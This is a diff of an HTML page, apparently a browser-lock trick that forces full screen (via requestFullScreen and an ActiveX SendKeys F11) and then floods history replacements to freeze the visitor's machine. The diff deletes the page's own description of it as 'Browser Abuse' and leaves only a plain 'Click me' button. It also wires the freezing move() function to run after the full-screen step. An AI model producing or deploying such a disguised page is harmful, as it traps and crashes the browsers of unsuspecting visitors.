@@ -2,14 +2,6 @@
 <html>
 <head>
 <script src="http://code.jquery.com/jquery-1.9.1.js"></script>
-
-<style>
-	img {
-	    width: 100%;
-	    height: auto;
-	}
-</style>
-
 <script> 
 
 	function callerinterval(){
@@ -50,6 +42,8 @@
 	      wscript.SendKeys("{F11}");
 	    }
 	  }
+
+	  move();
 	}
 
 	function move() {
@@ -60,14 +54,10 @@
 </head>
 
 
-<body onmouseclick="move()" onLoad="callerinterval()" style="background:#00000 url('transparent.jpeg') no-repeat top right; cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
+<body onLoad="callerinterval()" style="background:#00000 url('transparent.jpeg') no-repeat top right; cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
 
 <div>
-	<Strong>Browser Abuse: Infinite url bombard </Strong>
-	<p> In this browser abuse, user clicks button or any part of the page, the page goes to full screen mode. </p>
-	<p> When user tries to get out of full screen mode, the infinite url freezes computer and creates memory hog </p>
-	<p> <Strong> Technique used:</Strong> Set interval with small timeframe less than a second, and history replace with long random digits or characters </p>
-	<input id="clickbutton" type="button" value="Click me" onclick="move()" /> <br /> <br /> <br /> 
+	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" />
 </div>
 
 </body>
